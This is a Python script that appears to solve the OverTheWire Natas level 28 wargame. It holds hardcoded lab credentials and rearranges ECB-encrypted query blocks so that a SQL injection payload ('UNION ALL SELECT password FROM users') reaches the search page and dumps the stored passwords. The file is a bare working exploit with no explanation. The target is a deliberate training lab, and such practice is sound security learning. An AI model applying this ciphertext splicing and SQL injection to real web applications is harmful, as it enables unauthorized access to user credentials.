#!/usr/bin/env python3
import requests
import urllib.parse
import base64
import math

url = 'http://natas28.natas.labs.overthewire.org'
search_url = url + '/search.php'

s = requests.Session()
s.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

BLOCK = 16

# 1) baseline ciphertext for alignment
r = s.post(url, data={'query': ' ' * 10}, allow_redirects=True)
token = urllib.parse.unquote(r.url.split('=', 1)[1])
baseline_ct = base64.b64decode(token)   # bytes

# header = first 3 blocks (48 bytes), footer = rest
header = baseline_ct[:3 * BLOCK]
footer = baseline_ct[3 * BLOCK:]

# 2) get ciphertext for the SQL payload
sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
r2 = s.post(url, data={'query': sqli}, allow_redirects=True)
token2 = urllib.parse.unquote(r2.url.split('=', 1)[1])
exploit_ct = base64.b64decode(token2)

# 3) number of blocks the plaintext sqli occupies
nblocks = math.ceil(len(sqli.encode('utf-8')) / BLOCK)

# extract the corresponding blocks from exploit_ct (starting at block index 3)
start = 3 * BLOCK
middle = exploit_ct[start:start + nblocks * BLOCK]

# 4) assemble final ciphertext and send it
final_ct = header + middle + footer
final_b64 = base64.b64encode(final_ct).decode('ascii')

resp = s.get(search_url, params={'query': final_b64})
print(resp.text)
